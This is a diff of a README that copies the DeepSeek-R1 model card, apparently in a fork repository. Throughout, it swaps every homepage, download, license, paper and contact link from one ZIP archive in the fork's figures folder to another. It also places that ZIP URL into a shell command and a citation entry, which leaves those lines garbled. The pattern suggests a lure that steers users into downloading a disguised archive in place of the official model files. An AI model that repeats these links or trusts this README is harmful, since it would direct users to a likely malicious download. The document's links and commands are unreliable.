@@ -4,42 +4,42 @@
 <!-- markdownlint-disable no-duplicate-header -->
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" width="60%" alt="DeepSeek-V3" />
+  <img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" width="60%" alt="DeepSeek-V3" />
 </div>
 <hr>
 <div align="center" style="line-height: 1;">
-  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" target="_blank" style="margin: 2px;">
-    <img alt="Homepage" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" style="display: inline-block; vertical-align: middle;"/>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" target="_blank" style="margin: 2px;">
+    <img alt="Homepage" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" style="display: inline-block; vertical-align: middle;"/>
   </a>
-  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" target="_blank" style="margin: 2px;">
-    <img alt="Chat" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip🤖%20Chat-DeepSeek%20R1-536af5?color=536af5&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" target="_blank" style="margin: 2px;">
+    <img alt="Chat" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip🤖%20Chat-DeepSeek%20R1-536af5?color=536af5&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
   </a>
-  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" target="_blank" style="margin: 2px;">
-    <img alt="Hugging Face" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip%F0%9F%A4%97%20Hugging%20Face-DeepSeek%20AI-ffc107?color=ffc107&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-</div>
-
-<div align="center" style="line-height: 1;">
-  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" target="_blank" style="margin: 2px;">
-    <img alt="Discord" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip%20AI-7289da?logo=discord&logoColor=white&color=7289da" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" target="_blank" style="margin: 2px;">
-    <img alt="Wechat" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip%20AI-brightgreen?logo=wechat&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" target="_blank" style="margin: 2px;">
-    <img alt="Twitter Follow" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" style="display: inline-block; vertical-align: middle;"/>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" target="_blank" style="margin: 2px;">
+    <img alt="Hugging Face" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip%F0%9F%A4%97%20Hugging%20Face-DeepSeek%20AI-ffc107?color=ffc107&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
   </a>
 </div>
 
 <div align="center" style="line-height: 1;">
-  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" style="margin: 2px;">
-    <img alt="License" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip" style="display: inline-block; vertical-align: middle;"/>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" target="_blank" style="margin: 2px;">
+    <img alt="Discord" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip%20AI-7289da?logo=discord&logoColor=white&color=7289da" style="display: inline-block; vertical-align: middle;"/>
+  </a>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" target="_blank" style="margin: 2px;">
+    <img alt="Wechat" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip%20AI-brightgreen?logo=wechat&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
+  </a>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" target="_blank" style="margin: 2px;">
+    <img alt="Twitter Follow" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" style="display: inline-block; vertical-align: middle;"/>
+  </a>
+</div>
+
+<div align="center" style="line-height: 1;">
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" style="margin: 2px;">
+    <img alt="License" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip" style="display: inline-block; vertical-align: middle;"/>
   </a>
 </div>
 
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip"><b>Paper Link</b>👁️</a>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip"><b>Paper Link</b>👁️</a>
 </p>
 
 
@@ -56,7 +56,7 @@ To support the research community, we have open-sourced DeepSeek-R1-Zero, DeepSe
 **NOTE: Before running DeepSeek-R1 series models locally, we kindly recommend reviewing the [Usage Recommendation](#usage-recommendations) section.**
 
 <p align="center">
-  <img width="80%" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip">
+  <img width="80%" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip">
 </p>
 
 ## 2. Model Summary
@@ -85,13 +85,13 @@ To support the research community, we have open-sourced DeepSeek-R1-Zero, DeepSe
 
 | **Model** | **#Total Params** | **#Activated Params** | **Context Length** | **Download** |
 | :------------: | :------------: | :------------: | :------------: | :------------: |
-| DeepSeek-R1-Zero | 671B | 37B | 128K   | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)   |
-| DeepSeek-R1   | 671B | 37B |  128K   | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)   |
+| DeepSeek-R1-Zero | 671B | 37B | 128K   | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)   |
+| DeepSeek-R1   | 671B | 37B |  128K   | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)   |
 
 </div>
 
 DeepSeek-R1-Zero & DeepSeek-R1 are trained based on DeepSeek-V3-Base. 
-For more details regarding the model architecture, please refer to [DeepSeek-V3](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip) repository.
+For more details regarding the model architecture, please refer to [DeepSeek-V3](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip) repository.
 
 ### DeepSeek-R1-Distill Models
 
@@ -99,12 +99,12 @@ For more details regarding the model architecture, please refer to [DeepSeek-V3]
 
 | **Model** | **Base Model** | **Download** |
 | :------------: | :------------: | :------------: |
-| DeepSeek-R1-Distill-Qwen-1.5B  | [Qwen2.5-Math-1.5B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)   |
-| DeepSeek-R1-Distill-Qwen-7B  | [Qwen2.5-Math-7B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)   |
-| DeepSeek-R1-Distill-Llama-8B  | [Llama-3.1-8B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)   |
-| DeepSeek-R1-Distill-Qwen-14B   | [Qwen2.5-14B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)   |
-|DeepSeek-R1-Distill-Qwen-32B  | [Qwen2.5-32B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)   |
-| DeepSeek-R1-Distill-Llama-70B  | [Llama-3.3-70B-Instruct](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)   |
+| DeepSeek-R1-Distill-Qwen-1.5B  | [Qwen2.5-Math-1.5B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)   |
+| DeepSeek-R1-Distill-Qwen-7B  | [Qwen2.5-Math-7B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)   |
+| DeepSeek-R1-Distill-Llama-8B  | [Llama-3.1-8B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)   |
+| DeepSeek-R1-Distill-Qwen-14B   | [Qwen2.5-14B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)   |
+|DeepSeek-R1-Distill-Qwen-32B  | [Qwen2.5-32B](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)   |
+| DeepSeek-R1-Distill-Llama-70B  | [Llama-3.3-70B-Instruct](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip) | [🤗 HuggingFace](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)   |
 
 </div>
 
@@ -170,15 +170,15 @@ We slightly change their configs and tokenizers. Please use our setting to run t
 
 
 ## 5. Chat Website & API Platform
-You can chat with DeepSeek-R1 on DeepSeek's official website: [https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip), and switch on the button "DeepThink"
+You can chat with DeepSeek-R1 on DeepSeek's official website: [https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip), and switch on the button "DeepThink"
 
-We also provide OpenAI-Compatible API at DeepSeek Platform: [https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)
+We also provide OpenAI-Compatible API at DeepSeek Platform: [https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)
 
 ## 6. How to Run Locally
 
 ### DeepSeek-R1 Models
 
-Please visit [DeepSeek-V3](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip) repo for more information about running DeepSeek-R1 locally.
+Please visit [DeepSeek-V3](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip) repo for more information about running DeepSeek-R1 locally.
 
 **NOTE: Hugging Face's Transformers has not been directly supported yet.**
 
@@ -186,16 +186,16 @@ Please visit [DeepSeek-V3](https://raw.githubusercontent.com/Gpcode233/DeepSeek-
 
 DeepSeek-R1-Distill models can be utilized in the same manner as Qwen or Llama models.
 
-For instance, you can easily start a service using [vLLM](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip):
+For instance, you can easily start a service using [vLLM](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip):
 
 ```shell
 vllm serve deepseek-ai/DeepSeek-R1-Distill-Qwen-32B --tensor-parallel-size 2 --max-model-len 32768 --enforce-eager
 ```
 
-You can also easily start a service using [SGLang](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip)
+You can also easily start a service using [SGLang](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip)
 
 ```bash
-python3 -m https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip --model deepseek-ai/DeepSeek-R1-Distill-Qwen-32B --trust-remote-code --tp 2
+python3 -m https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip --model deepseek-ai/DeepSeek-R1-Distill-Qwen-32B --trust-remote-code --tp 2
 ```
 
 ### Usage Recommendations
@@ -208,11 +208,11 @@ python3 -m https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/
 4. When evaluating model performance, it is recommended to conduct multiple tests and average the results.
 
 ## 7. License
-This code repository and the model weights are licensed under the [MIT License](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip).
+This code repository and the model weights are licensed under the [MIT License](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip).
 DeepSeek-R1 series support commercial use, allow for any modifications and derivative works, including, but not limited to, distillation for training other LLMs. Please note that:
-- DeepSeek-R1-Distill-Qwen-1.5B, DeepSeek-R1-Distill-Qwen-7B, DeepSeek-R1-Distill-Qwen-14B and DeepSeek-R1-Distill-Qwen-32B are derived from [Qwen-2.5 series](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip), which are originally licensed under [Apache 2.0 License](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip), and now finetuned with 800k samples curated with DeepSeek-R1.
-- DeepSeek-R1-Distill-Llama-8B is derived from Llama3.1-8B-Base and is originally licensed under [llama3.1 license](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip).
-- DeepSeek-R1-Distill-Llama-70B is derived from Llama3.3-70B-Instruct and is originally licensed under [llama3.3 license](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip).
+- DeepSeek-R1-Distill-Qwen-1.5B, DeepSeek-R1-Distill-Qwen-7B, DeepSeek-R1-Distill-Qwen-14B and DeepSeek-R1-Distill-Qwen-32B are derived from [Qwen-2.5 series](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip), which are originally licensed under [Apache 2.0 License](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip), and now finetuned with 800k samples curated with DeepSeek-R1.
+- DeepSeek-R1-Distill-Llama-8B is derived from Llama3.1-8B-Base and is originally licensed under [llama3.1 license](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip).
+- DeepSeek-R1-Distill-Llama-70B is derived from Llama3.3-70B-Instruct and is originally licensed under [llama3.3 license](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip).
 
 ## 8. Citation
 ```
@@ -222,11 +222,11 @@ DeepSeek-R1 series support commercial use, allow for any modifications and deriv
       year={2025},
       eprint={2501.12948},
       archivePrefix={arXiv},
-      primaryClass={https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip},
-      url={https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip}, 
+      primaryClass={https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip},
+      url={https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip}, 
 }
 
 ```
 
 ## 9. Contact
-If you have any questions, please raise an issue or contact us at [https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/DeepSeek-R1_v3.8.zip).
+If you have any questions, please raise an issue or contact us at [https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-R1/main/figures/Seek-Deep-3.2.zip).
